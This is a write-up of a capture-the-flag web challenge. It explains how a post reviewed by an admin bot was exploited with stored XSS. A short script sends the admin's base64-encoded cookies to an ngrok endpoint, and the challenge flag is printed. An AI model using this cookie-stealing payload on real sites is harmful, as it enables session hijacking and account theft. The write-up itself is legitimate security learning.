# Description
## Government Agriculture Network
Label: web

Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the shareholders." You wonder if there is a similar concept here.

Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child.

The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity.

You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to rescue it.

# Solution
This one just links to a site `https://govagriculture.web.ctfcompetition.com`. The site just contains 2 images, and a input along with a submit button to create a post. There is also an admin link in the top nav bar. Clicking the admin link just lead to `https://govagriculture.web.ctfcompetition.com/admin` but redirected back to the main page. Clicking the submitted button did a POST to `https://govagriculture.web.ctfcompetition.com/post` with a response page that just said `Your post was submitted for review. Administator will take a look shortly. `. Nothing else happens afterwards. I was stuck on this for a while as I had no idea what to do since the submit or admin links did not appear to do anything. As the name of the task implies, an xss exploit is used somehow but I couldn't figure out how. After spending a lot of time clicking around, I saw a hint that creating a post would get a fake 'admin' on the server to view the post. Without that hint I would be wasting a lot more time.

So now with that hint, I assumed that I would have to use xss to grab the cookies when the admin viewed the page and then send it back somehome. Unsure if my ISP even let me expose a webserver, I setup a tunnel using `ngrok`. All I did was run `ngrok http 80` and did not even need to setup a server since all I needed was a way to see the data. After setting that up, I entered this script as the post contents
```js
<script>
var data = btoa(document.cookie);
document.write("<img src=\"https://<ngrok-ip>.ngrok.io/?data=" + data + "\">");
</script>
```
The idea is that the cookies would be ecoded and sent to the endpoint through a request when the image tries to load.

After hitting submit, I looked in the dashboard and saw that indeed a request had been made to the url along with the cookies as a query parameter. A quick decode and we have our flag `CTF{8aaa2f34b392b415601804c2f5f0f24e}`